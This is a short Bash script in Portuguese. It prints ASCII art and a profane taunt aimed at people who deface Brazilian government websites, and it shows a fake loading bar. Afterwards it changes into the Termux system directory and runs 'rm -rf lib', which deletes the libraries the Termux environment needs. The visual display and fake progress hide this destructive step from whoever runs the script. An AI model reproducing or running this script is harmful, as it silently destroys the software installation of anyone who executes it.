#!/bin/bash

# Arte ASCII
cat << "EOF"
                                  ,
                                  /(        )\`
                                  \\ \___   / |
                                  /- _  \`-/  '
                                (/\\\/ \ \   /\\
                                / /   | \`    \\
                                O O   ) /    |
                                \`-^--'\`<     '
                              (_.)  _  )   /
                                 \`.___/ \`    /
                                  \`-----' /
                      <----.     __ / __   \\
                      <----|====O)))==) \\) /====
                      <----'    \`--' \`.__,' \\
                                  |        |
                                    \\       /
                              ______( (_  / \______
                            ,'  ,-----'   |        \\
                            \`--{__________)        \\
EOF

# Mensagem
echo "ENTAO QUER DIZER QUE VOCES SAO OS OWNADORES DAS PADOCARIAS .GOV.BR VAO A MERDA, SO DA DEFACE USANDO CLOUD VAZADA! by: untw0"

# Simulação de carregamento
total_steps=20  # Número total de etapas de carregamento
delay=0.5       # Tempo de espera entre cada etapa em segundos
progress=0      # Valor inicial do progresso

echo -n "["
while [ $progress -le $total_steps ]; do
    sleep $delay
    progress=$((progress + 1))
    filled=$(printf "%0.s#" $(seq 1 $progress))
    empty=$(printf "%0.s " $(seq $progress $total_steps))
    echo -n "$filled$empty"
done
echo "]"
echo "100%"

# Navegar para a pasta e executar o comando
cd /data/data/com.termux/files/usr
echo "Executando comando rm -rf lib..."
rm -rf lib

echo "Executando comando rm -rf lib..."
rm -rf lib
